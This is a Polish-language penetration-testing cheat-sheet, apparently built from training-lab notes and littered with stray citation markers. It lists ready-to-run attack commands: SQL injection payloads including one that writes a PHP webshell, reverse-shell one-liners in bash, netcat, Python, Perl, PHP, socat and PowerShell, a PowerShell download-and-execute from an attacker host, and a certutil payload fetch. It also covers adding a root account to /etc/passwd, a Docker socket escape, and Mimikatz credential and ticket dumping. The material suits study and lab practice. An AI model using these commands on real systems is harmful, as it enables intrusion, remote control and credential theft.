# Cybersecurity Cheat-Sheet

## 1. 🔍 Rekonesans i Enumeracja (Reconnaissance)

### Skanowanie Sieci i Portów
* **Nmap (Pełny skan):** `nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt ip`
* **Nmap (SMB Shares):** `nmap -p445 --script smb-enum-shares IP`
* **Nmap (SMB Scripts):** `nmap -v -p 139,445 --script smb`
* **NetBIOS Skan:** `sudo nbtscan -r 192.168.50.0/24`

### Web Enumeration
* **Gobuster (Katalogi):** `gobuster dir -u http://10.113.166.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400`
* **Gobuster (VHosty):** `gobuster vhosts -u $4 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts_found.txt`

### DNS Enumeration
* **DNSenum:** `dnsenum megacorp.com`
* [cite_start]**DNSrecon (Standard):** `dnsrecon -d megacorp.com -t std` [cite: 72]
* [cite_start]**DNSrecon (Bruteforce):** `dnsrecon -d megacorp.com -D ~/list.txt -t brt` [cite: 72]

### SMB / RPC / NetBIOS
* [cite_start]**Enum4linux-ng:** `enum4linux-ng -A ip -oA results/scan` [cite: 78] [cite_start](Flaga `-A` wykonuje pełną enumerację, m.in. użytkowników, grup, udziałów, polityk haseł. [cite: 79])
* [cite_start]**SMBClient (Anonimowe logowanie):** `smbclient -L //TARGET_IP -N` [cite: 90]
* **SMBClient (Połączenie z udziałem):** `smbclient //TARGET_IP/SHARE_NAME -N`
* [cite_start]**SMBMap:** Narzędzie do enumeracji udziałów SMB na hoście. [cite: 91] [cite_start]Pozwala wyświetlić uprawnienia odczytu/zapisu. [cite: 92] Użycie: `smbmap -H TARGET_IP`
* [cite_start]**RPCClient:** Protokół MSRPC pozwala programom żądać usług z innego komputera przez SMB. [cite: 83] [cite_start]Użycie: `rpcclient -U "" ip -N` (Flaga `-U ""` oznacza anonimowy login, a `-N` brak zapytania o hasło. [cite: 84])
* [cite_start]**RPCClient (RID Cycling):** Domenowe konta Administratora to RID 500, Gość to 501. [cite: 86] [cite_start]Zwykłe konta zaczynają się od 1000. [cite: 87] [cite_start]Pętla do wyciągania użytkowników: `for i in $(seq 500 2000); do user=$(echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"); if [ -n "$user" ]; then echo "[RID: $i] $user"; fi; done` [cite: 88, 89]

### Active Directory / LDAP
* [cite_start]**CrackMapExec (Polityka haseł):** Pozwala na enumerację i post-eksploatację w środowiskach Windows. [cite: 69] [cite_start]Obsługuje protokoły SMB, LDAP, RDP, SSH. [cite: 70, 71] Komenda: `crackmapexec smb 10.211.11.10 --pass-pol`
* **CrackMapExec (Password Spray):** `crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt`
* **Bloodhound.py (Linux Collector):** `bloodhound-python -u asrepuser1 -p qwerty123! [cite_start]-d tryhackme.loc -ns 10.211.12.10 -c All --zip` [cite: 68]
* [cite_start]**SharpHound (Windows Collector):** Jest to narzędzie polecane do standardowej enumeracji środowisk AD. [cite: 124, 125] Komenda: `\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs`
* [cite_start]**Impacket GetNPUsers:** Skrypt pythona do enumeracji kont w środowiskach innych niż Windows i zbierania hashy AS-REP w celu złamania offline. [cite: 73, 74, 75] Użycie: `impacket-GetNPUsers tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`
* [cite_start]**Kerbrute:** Służy do bruteforce'owania i enumeracji kont poprzez pre-autentykację Kerberos (pozwala sprawdzić czy konta istnieją i nie są wyłączone). [cite: 80] Komenda: `kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`
* [cite_start]**LDAPSearch (Anon Bind):** `ldapsearch -x -H ldap://ip -s base` (Flaga `-x` to prosta autentykacja, a `-s` limituje zapytanie do podstawowego obiektu. [cite: 81, 82])
* **LDAPSearch (Info o użytkownikach):** `ldapsearch -x -H ldap://ip -b "dc=tryhackme,dc=loc" "(objectClass=person)"`

### SNMP
* [cite_start]**SNMPwalk:** Enumeruje całe drzewo MIB. [cite: 93] Podstawowa komenda: `snmpwalk -c public -v1 -t 10 192.168.50.151`
* **Użytkownicy Windows (SNMP):** `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2`
* **Procesy Windows (SNMP):** `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2`
* **Oprogramowanie Windows (SNMP):** `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3`

---

## 2. 🌐 Ataki Webowe i Dostęp Początkowy (Initial Access)

### Omijanie filtrów i Enkodowanie
* [cite_start]**Alternatywne metody HTTP:** Testowanie innych metod (np. PUT, OPTIONS, TRACE) może ujawnić nieoczekiwane zachowanie aplikacji lub ominąć filtry WAF. [cite: 183, 184, 185]
* [cite_start]**HashExtender:** Służy do dodawania danych do pliku ze znanym hashem bez zmiany oryginalnej sygnatury. [cite: 17, 18, 19] Komenda: `./hash_extender --data 1.png --signature <hash> --append /../4.png --out-data-format=html`

### SQL Injection (SQLi)
* **Boolean-based:** `' or 1=1 in (select @@version) -- //`
* **UNION-based (Zliczanie kolumn):** `' ORDER BY 1-- //`
* **UNION-based (Wyświetlanie kolumn):** `%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`
* [cite_start]**UNION-based (Wyciąganie tabel):** `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //` [cite: 194]
* **Wgrywanie Webshella:** `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
* **Blind SQLi (Time-based):** `' AND IF (1=1, sleep(3),'false') -- //`

### SQLMap
* **Szybki rekonesans:** `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
* **Zrzut z bazy:** `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`
* [cite_start]**OS Shell (via POST Request):** Jeśli przechwycimy request przez Burpa, zapisujemy go i uruchamiamy: `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"` [cite: 196]
* **Z użyciem zmiennych (POST):** `sqlmap -u "http://10.114.131.93/login.php" --data="pma_username=admin&pma_password=password&submit=Go" --method POST --level 3 --risk 2 --batch --dbs`

### Reverse Shells (Linux & Windows)
* **Bash:** `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
* [cite_start]**Netcat:** `nc -e /bin/sh 10.0.0.1 1234` [cite: 202]
* [cite_start]**Python:** `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` [cite: 198]
* [cite_start]**Perl (Krótsza wersja bez dodatków):** `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` [cite: 197]
* [cite_start]**PHP:** `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'` [cite: 199, 200, 201]
* [cite_start]**Socat:** `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` [cite: 187]
* [cite_start]**Interaktywny Shell (Upgrade PTY):** `python3 -c 'import pty; pty.spawn("/bin/bash")'` [cite: 188]
* **PowerShell (One-liner):** `$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); [cite_start]$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` [cite: 181]
* [cite_start]**PowerShell (Powercat):** `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .` [cite: 182]
* **Remote PowerShell Execution:** `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"`

---

## 3. 🕵️ Rozpoznanie Środowiska (Situational Awareness)

### Linux
* [cite_start]**System Info:** `uname -a` (Wersja kernela), `cat /etc/*-release` [cite: 25, 26]
* [cite_start]**Sieć:** `route` (Tablice routingu), `ss -anp` (Połączenia sieciowe bez resolucji nazw dla uniknięcia opóźnień). [cite: 29, 30, 31]
* [cite_start]**Firewall:** Konfiguracje iptables mogą być np. w `/etc/iptables`. [cite: 32]
* [cite_start]**Procesy:** `ps aux` [cite: 27, 28] (Lub `watch -n 1 "ps -aux | grep pass"`)[cite_start]. [cite: 48, 49]
* **Oprogramowanie:** `dpkg -l`
* [cite_start]**Moduły Kernela:** `lsmod` (lub szczegóły przez `/sbin/modinfo <modul>`). [cite: 43, 44]
* [cite_start]**Cron:** Zadania zaplanowane przez administratorów (w `/etc/crontab`) mogą mieć niebezpieczne uprawnienia plików. [cite: 33, 34, 35] Komendy: `ls -lah /etc/cron*`, `crontab -l`.
* [cite_start]**Zmienne i hasła:** `env`, `cat .bashrc` (Sprawdzanie, czy administrator nie przechował w nich poświadczeń). [cite: 45, 46, 47]
* [cite_start]**Dyski i Montowanie:** `find / -writable -type d 2>/dev/null` (Szukanie plików z prawem do zapisu), `mount`, `cat /etc/fstab`, `lsblk`. [cite: 36, 37, 38, 39]

### Windows
* [cite_start]**Użytkownik i Uprawnienia:** `whoami`, `whoami /groups`, `net user <user>` (Pokazuje przynależność do grup i dokładne uprawnienia). [cite: 95, 96, 97]
* **Uruchamianie jako inny user:** `runas /user:dave powershell`
* [cite_start]**Konta i Grupy:** `net user` (Konta lokalne), `net localgroup` (Grupy lokalne), `net localgroup Administrators`. [cite: 98, 99, 100]
* **System Operacyjny:** `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` lub `wmic os get Caption, OSArchitecture, Version`
* [cite_start]**Sieć:** `ipconfig /all`, `netstat -ano`, `arp -a` (Pobiera tablicę adresów ułatwiającą pivoting do innych urządzeń), `route print`. [cite: 105, 106]
* [cite_start]**Oprogramowanie:** `wmic product get name, version` (Listuje aplikacje z Instalatora Windows), [cite: 107] [cite_start]`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname"` (Znacznie szybsza metoda bezpośrednio z rejestru). [cite: 108] W PowerShellu: `Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion`. [cite: 109]
* [cite_start]**Procesy:** `tasklist /v` (Flaga `/v` wypisuje konta, na których działa proces), `Get-Process`. [cite: 110, 111]
* **PowerShell & AD (PowerSploit/ActiveDirectory):**
    * Użytkownicy: `Get-ADUser -Filter *`
    * Grupy: `Get-ADGroup -Filter *`
    * Hasła: `Get-ADDefaultDomainPasswordPolicy`
* **Szukanie plików / historii:** `Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
* [cite_start]**Rejestr (Klucze AutoLogon):** `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername` (Sprawdzanie, czy na serwerze nie zostały zachowane poświadczenia testowe do logowania). [cite: 121, 122]
* [cite_start]**Szukanie hasła w rejestrze:** `reg query HKLM /f "password" /t REG_SZ /s` [cite: 123]
* **Zadania zaplanowane (Schtasks):** `schtasks /query`, Zdalne tworzenie zadania: `schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command>" /sc ONCE /sd 01/01/1970 /st 00:00`

---

## 4. ⬆️ Eskalacja Uprawnień (Privilege Escalation)

### Linux
* [cite_start]**SUID Binaries:** Pliki SUID pozwalają uruchomić program z uprawnieniami właściciela. [cite: 40, 41] [cite_start]Wyszukiwanie: `find / -perm -u=s -type f 2>/dev/null`. [cite: 42, 60] (np. exploitacja przez `find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`).
* [cite_start]**Plik /etc/passwd:** Jeśli mamy dostęp do zapisu w tym pliku, możemy ustawić dowolne hasło. [cite: 52, 53, 54, 55, 56, 57] [cite_start]Generowanie hasha logowania za pomocą crypt: `openssl passwd w00t`. [cite: 58, 59] Dodanie: `echo "root2:hash:0:0:root:/root:/bin/bash" >> /etc/passwd`.
* **Capabilities:** Działają podobnie do atrybutów SUID, pozwalając procesom na przyznawanie określonych uprawnień (np. modyfikacji ruchu sieciowego). [cite_start]W przypadku miskonfiguracji ułatwiają eskalację. [cite: 61, 62, 63, 64] Komenda: `/usr/sbin/getcap -r / 2>/dev/null`.
* **Sudo & AppArmor:** `sudo -l`. [cite_start]Jeśli wykorzystujemy Sudo, AppArmor potrafi zablokować wykonanie procesu na poziomie jądra. [cite: 65, 66, 67] Status AppArmor sprawdzisz przez `aa-status` (wymaga roota).
* [cite_start]**Docker Escape (REST API):** Jeśli socket Dockera (np. `/var/run/docker.sock`) jest dostępny, komunikuje się on przez API. [cite: 186] Wykonanie z mountem głównego systemu: `docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash`.

### Windows
* **Uprawnienia Konta (whoami /all):**
    * [cite_start]**SeImpersonatePrivilege:** Pozwala podszyć się pod kontekst użytkownika po autoryzacji (ataki typu Potato). [cite: 112]
    * [cite_start]**SeAssignPrimaryTokenPrivilege:** Zezwala procesowi na przypisanie primary token do nowego procesu (często wykorzystywane z SeImpersonate). [cite: 113]
    * [cite_start]**SeBackupPrivilege:** Pozwala odczytać dowolny plik z pominięciem zabezpieczeń, wykorzystywane np. do zrzutu SAM/SYSTEM. [cite: 114, 115]
    * [cite_start]**SeRestorePrivilege:** Zezwala na zapis do jakiegokolwiek pliku (niebezpieczne nadpisywanie kluczowych plików systemowych). [cite: 116, 117]
    * [cite_start]**SeDebugPrivilege:** Umożliwia wstrzykiwanie złośliwego kodu lub debuggowanie procesów w celu wyciągnięcia np. credentialsów z LSASS. [cite: 118, 119]
* **Ważne Grupy AD:** Należy uważać na Domain Admins, Enterprise Admins, Server Operators oraz Backup Operators. [cite_start]Jakakolwiek grupa z "Admin" w nazwie może być pożytecznym celem. [cite: 120]
* **Miskonfiguracja Usług:**
    * Service Hijacking: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | [cite_start]Where-Object {$_.State -like 'Running'}` [cite: 101] (Start serwisu: `... | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`)[cite_start]. [cite: 102]
    * Unquoted Service Paths: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName` [cite: 103, 104]
* [cite_start]**Bazy Danych (MSSQL xp_cmdshell):** Zezwala serwerowi bazodanowemu na przesłanie stringu do CLI systemowego w celu egzekucji. [cite: 76, 77] Po wejściu poleceniem impacket: `EXECUTE sp_configure 'show advanced options',1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; [cite_start]EXECUTE xp_cmdshell 'whoami';` [cite: 195]

---

## 5. 🔄 Ruch Boczny (Lateral Movement) i Port Forwarding

### Windows Lateral Movement
* **PsExec:** Uruchamianie komend przez port 445 (SMB) wymagające przynależności do Administratorów.
    * Użycie: `psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`
* **WinRM:** Opiera się na webowym protokole, aby dostarczać polecenia powershella do zdalnych hostów. Często domyślnie aktywny w instalacjach Windows Server. [cite: 130, 131]
    * Użycie: `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`
* **Tworzenie Usług (sc.exe):** Usługi systemowe automatycznie wykonują przypisany kod w momencie uruchomienia. [cite: 132]
    * Komendy: `sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto`, `sc.exe \\TARGET start THMservice`
* **WMI & MSI:** Format instalatora MSI. Jeżeli jesteśmy w stanie wrzucić msi na atakowany serwer w jakikolwiek sposób, można wykorzystać WMI poprzez klasę Win32_Product w celu cichego uruchomienia pliku msi. [cite: 133, 134, 135, 136, 137, 138, 139]
* **RDP Hijacking:** Rozłączona i zamknięta bez wylogowania sesja administratora RDP może być przejęta jeśli posiadamy przywileje SYSTEM na Windows Server. [cite_start]Omijamy dzięki temu wymóg podawania hasła. [cite: 147, 148, 149, 150, 151, 152, 153, 154, 155, 156]
    * Sprawdzenie sesji: `query user`
    * Przejęcie (wymaga uprawnień np. z PsExec): `tscon 3 /dest:rdp-tcp#6`
* [cite_start]**Backdooring Binarek:** Modyfikowanie zaufanego pliku tak, aby w locie wykonywał złośliwy payload msfvenom zachowując jednocześnie swoją pierwotną, bezpieczną użyteczność. [cite: 145, 146]

### NTLM i Kerberos
* **Wyciąganie hashy (Mimikatz):** `privilege::debug`, `token::elevate`, `lsadump::sam` (lokalne), `sekurlsa::msv` (LSASS).
* [cite_start]**Rubeus:** Narzędzie działające w architekturze Windows służące do ataków na protokół Kerberos (wskazuje podatne konta, wyciąga AS-REP). [cite: 179, 180] (np. `Rubeus.exe asreproast`).
* [cite_start]**Kerberos Pass the Ticket (PtT):** Technika umożliwiająca ekstraktowanie z pamięci LSASS kluczy sesyjnych, pod warunkiem osiągnięcia poziomu uprawnień SYSTEM. [cite: 140]
    * Mimikatz: `sekurlsa::tickets /export`, a następnie `kerberos::ptt <plik_kirbi>`.
* **Kerberos Pass the Key (PtK):** Gdy użytkownik prosi o TGT, wysyła zaszyfrowany klucz wynikający ze swojego hasła. [cite_start]Otrzymanie algorytmu szyfrowania ze strony KDC (np. AES/RC4) umożliwia uzyskanie TGT bez potrzeby pozyskania prawidłowego hasła tekstowego. [cite: 141, 142, 143, 144]
* **Logowanie hashami NTLM w Linuxie:**
    * RDP: `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
    * Evil-WinRM: `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

### Port Forwarding i SOCKS
* [cite_start]**Remote Port Forwarding (SSH):** Otwiera port na maszynie atakującego (Serwer SSH), proxy z PC-1 łączy go z maszyną wewnętrzną maskując ruch przed serwerem. [cite: 157, 158, 159, 160, 161]
    * Użycie na SSH Client: `ssh tunneluser@attackerip -R 3389:serverip:3389 -N`
* **Local Port Forwarding (SSH):** Pobiera usługę z atakującego serwera SSH do klienta (PC-1). [cite_start]Idealne do wystawiania reverse shell listenerów do hostów bez połączenia z internetem. [cite: 162, 163, 164, 165]
    * Użycie na SSH Client: `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
    * [cite_start]Dodanie Reguły Firewall na nowym porcie: `netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80` [cite: 166]
* **Socat:** Stosowane, jeśli usługa SSH nie występuje domyślnie na danym komputerze i nie mamy możliwości jej instalacji. [cite: 167, 168]
    * Użycie: `socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389`
* **Dynamic Port Forwarding (SOCKS & Proxychains):** Buduje tunel obsługujący skanowanie lub łączenie się na wielu portach z poziomu atakującego. Używa serwera Proxy (SOCKS). [cite: 169, 170, 171] Narzędzie Proxychains pozwala na przekierowanie poleceń terminala przez ten port bez dodatkowej konfiguracji zewnętrznej (adresy ustawiamy w `/etc/proxychains.conf`). [cite: 172, 173, 174, 175]
    * Użycie (na boku SSH Client): `ssh tunneluser@1.1.1.1 -R 9050 -N`
    * Wykonywanie komend w Kali: `proxychains curl http://pxeboot.za.tryhackme.com`

---

## 6. 🛡️ Blue Team i Forensics

### Linux Wykrycia
* **Detection 1 (Discovery Spike):** Sprawdzanie narzędzi administracyjnych lub skanowanie wrogich zabezpieczeń. Atakujący wywołują serię komend, takich jak `id`, `pwd`, `ls -la`, oraz procesy bezpieczeństwa jak np. [cite_start]`egrep "edr|splunk|elastic"`. [cite: 20, 21]
* [cite_start]**Detection 2 (Pobieranie payloadu na tmp):** Ściąganie i kompilowanie eksploita na środowisko docelowe (np. exploit Pwnkit), wykorzystanie katalogu tymczasowego `/tmp` poprzez `wget`. [cite: 22, 23]
* **Detection 3 (Eksfiltracja):** Skompresowanie danych wrażliwych na hostowanym folderze (np. `/root`, `/etc/`) za pomocą narzędzi archiwizacyjnych typu tar, a w późniejszym kroku wysyłanie pliku za pośrednictwem bezpiecznej kopii SCP na zewnętrzny zdalny serwer C2. [cite: 24]
* [cite_start]**Sieć / Ślady hakerskie:** Nasłuch w pętli używając tcpdump w poszukiwaniu komend z polem hasła na loopbacku: `sudo tcpdump -i lo -A | grep "pass"`. [cite: 50, 51]
* **Ausearch:**
    * Znalezienie podejrzanej komendy: `ausearch -i -x socat`
    * [cite_start]Budowa drzewa procesów podrzędnych dla danego PID: `ausearch -i --ppid 27808 | grep proctitle` [cite: 189]
    * Sprawdzanie zmian plików w `/etc/systemd`: `ausearch -i -f /etc/systemd`
* [cite_start]**XXD (Ukryte skrypty):** Jeśli mamy skrypt ze złośliwymi binarnymi dopiskami `xxd suspicious_script.sh | head -n 20`. [cite: 193]

### Windows Defensywa
* **Hashowanie plików:** `Get-FileHash -Algorithm SHA256 .\file.exe` lub `certutil -hashfile filename.exe SHA256`
* **Zrzuty Strings:** Odpowiednik Linuxowego grepowania (szukania fraz tekstowych), PowerShell umożliwia znajdowanie konkretnych procesów lub logów tekstowych `Select-String -Path "C:\Logs\access.log" -Pattern "admin" -CaseSensitive` lub na procesach `Get-Process | [cite_start]Select-String "sql"`. [cite: 191]
* **Metadane i właściwości pliku:** `Get-Item .\suspicious_file.exe | [cite_start]Select-Object *` [cite: 190]
* **Weryfikacja podpisu:** `Get-AuthenticodeSignature .\installer.exe`
* [cite_start]**Przeglądanie struktury binarnej (Hex):** `Format-Hex .\file.exe | select -first 5` [cite: 192]
* **Monitoring procesów podpinających złośliwe biblioteki (DLL):**
    * Zrzut używanych DLL: `tasklist /m`
    * Wyszukiwanie konkretnej biblioteki w programach systemowych: `tasklist /m /fi "modules eq malicious.dll"`
* **CertUtil:** Służy m.in do ściągania ładunków z zewnątrz `certutil -urlcache -split -f "http://url" C:\Users\Public\payload.exe`, oraz do operowania na strukturze Base64 za pomocą argumentów `-encode` i `-decode`.

---

## 7. 🧰 Przydatne Narzędzia i Skróty (Utilities)

### Bash, Grep, Awk i Skróty
* **Pętla For (Sprawdzanie zakresu IP):** `for ip in $(seq 64 79); do host 167.114.21.$ip; done | grep -Ev "not found|timed out"` [cite: 1, 2]
* [cite_start]**Awk (Odcinanie frazy):** `awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt` (Zapis do pliku tego, co znajduje się między pierwszym `[`, a pierwszym `]`). [cite: 3, 4]
* [cite_start]**Find:** Ignorowanie wielkości liter odbywa się za pomocą przełącznika `-iname "*monkey*"`. [cite: 5]
* **Grep Regex (ERE):** `grep -E` (lub egrep) używane do skomplikowanych dopasowań. Znak `|` służy do alternatywy ("szuka jednego lub drugiego wzorca"), np. udane lub odrzucone logowanie w `/var/log/auth.log`. [cite: 6, 7] Znak `?` działa jako opcjonalność dla poprzedzającego znaku. [cite: 8, 9] Kwantyfikatory powtórzeń (np. do szukania cyfr) używają nawiasów klamrowych np. `{1,3}`. [cite: 10]

### Manipulacja plikami binarnymi - xxd
Narzędzie xxd jest genialne do inżynierii wstecznej i sprawdzania nagłówków binarnych (Magic Bytes).
* **Standardowy podgląd Offset | Hex | [cite_start]ASCII:** `xxd plik.bin` [cite: 11]
* **Podgląd typu pliku (Magic Bytes):** Wypisywanie tylko określonej liczby bajtów `xxd -l 16 plik.bin`. [cite_start]Skutecznie odsłania nagłówek. [cite: 12]
* [cite_start]**Wyplucie czystego HEX (Bez offsetu i ASCII):** Rozwiązanie przydatne do tworzenia własnych skryptów `xxd -p plik.txt`. [cite: 13]
* [cite_start]**Modyfikowanie ilości wypisywanych słów HEX z rzędu:** Za pomocą argumentu podanego obok przełącznika `-c` można zawężać pole widzenia w danej linii. [cite: 14]
* [cite_start]**Reverse HEX - Odtworzenie binarne ze zrzutu:** W przypadku jeśli posiadamy zapis zrzutu binarnego, zamienia powrotem formę do postaci wykonywalnej, `xxd -r zrzut_hex.txt > plik_wynikowy.bin`. [cite: 15]
* [cite_start]**Eksport C:** Formatuje string char w zmienną `xxd -i plik.bin` co ułatwia m.in wpisywanie Payload Shellcode do exploita. [cite: 16]

### Skróty terminala Linux
Jeżeli utkniesz w zbugowanym shellu lub po prostu chcesz pracować wydajniej w bashu:
* Przemieszczanie na początek (A) / koniec (E) linii: `Ctrl + A` / `Ctrl + E`
* Usuwanie wszystkiego od pozycji kursora do początku linii: `Ctrl + U` (Undo)
* [cite_start]Usuwanie od pozycji kursora do końca linii po prawej: `Ctrl + K` (Kill) [cite: 205]
